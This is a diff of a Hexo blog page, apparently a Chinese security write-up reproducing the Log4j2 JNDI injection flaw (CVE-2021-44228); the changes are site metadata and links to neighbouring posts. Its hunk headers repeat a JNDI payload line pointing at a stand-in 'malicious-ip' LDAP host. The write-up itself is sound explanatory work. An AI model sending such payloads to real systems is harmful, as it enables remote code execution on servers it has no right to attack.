@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="漏洞复现,Log4j2,JNDI注入">
+    <meta name="keywords" content="漏洞复现,Log4j2,JNDI注入,CVE-2021-44228">
     <meta name="description" content="Log4j2的JNDI注入漏洞（CVE-2021-44228）可以称之为“核弹”级别。Log4j2作为类似jdk级别的基础类库，几乎无人幸免。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -30,9 +30,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 6.0.0">
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="wa0er" type="application/atom+xml">
+
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/atom.xml" title="wa0er" type="application/atom+xml">
 </head>
 
 
@@ -474,7 +474,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-10-21
+                    2023-11-06
                 </div>
                 
 
@@ -1352,59 +1352,45 @@ ${jndi:ldap://malicious-ip/Exp}	#此时需要ldap服务端口为389<span aria-hi
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/posts/1e9a0fae.html">
+                <a href="/posts/d4f5920f.html">
                     <div class="card-image">
                         
-                        <img src="/medias/article_cover/Log4j2.png" class="responsive-img" alt="Log4j2（CVE-2021-44228）漏洞复现及原理思考">
+                        <img src="/medias/article_cover/Jupiter.png" class="responsive-img" alt="HTB-Jupiter">
                         
-                        <span class="card-title">Log4j2（CVE-2021-44228）漏洞复现及原理思考</span>
+                        <span class="card-title">HTB-Jupiter</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Log4j2的JNDI注入漏洞（CVE-2021-44228）可以称之为“核弹”级别。Log4j2作为类似jdk级别的基础类库，几乎无人幸免。
+                            HackTheBox-Jupiter
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-21
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-21
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                    漏洞复现
-                                </a>
-                            
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BB%86%E8%AF%BB%E7%BB%8F%E5%85%B8/" class="post-category">
-                                    细读经典
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                    靶机
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%BB%86%E8%AF%BB%E7%BB%8F%E5%85%B8/">
-                        <span class="chip bg-color">细读经典</span>
-                    </a>
-                    
-                    <a href="/tags/Log4j2/">
-                        <span class="chip bg-color">Log4j2</span>
-                    </a>
-                    
-                    <a href="/tags/JNDI%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">JNDI注入</span>
+                    <a href="/tags/HackTheBox/">
+                        <span class="chip bg-color">HackTheBox</span>
                     </a>
                     
                 </div>
@@ -1418,30 +1404,30 @@ ${jndi:ldap://malicious-ip/Exp}	#此时需要ldap服务端口为389<span aria-hi
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/48d4210.html">
+                <a href="/posts/3e4c0ff8.html">
                     <div class="card-image">
                         
-                        <img src="/medias/article_cover/CTF.gif" class="responsive-img" alt="蓝帽杯2021-OnePointerPHP">
+                        <img src="/medias/article_cover/Pilgrimage.png" class="responsive-img" alt="HTB-Pilgrimage">
                         
-                        <span class="card-title">蓝帽杯2021-OnePointerPHP</span>
+                        <span class="card-title">HTB-Pilgrimage</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            蓝帽杯2021-OnePointerPHP
+                            HackTheBox-Pilgrimage
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-14
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                    靶机
                                 </a>
                             
                             
@@ -1451,8 +1437,8 @@ ${jndi:ldap://malicious-ip/Exp}	#此时需要ldap服务端口为389<span aria-hi
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/HackTheBox/">
+                        <span class="chip bg-color">HackTheBox</span>
                     </a>
                     
                 </div>
@@ -1640,7 +1626,7 @@ ${jndi:ldap://malicious-ip/Exp}	#此时需要ldap服务端口为389<span aria-hi
             
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点文章总字数:&nbsp;<span
-                        class="white-color">57.9k&nbsp;字</span>
+                        class="white-color">62.4k&nbsp;字</span>
             
             
 
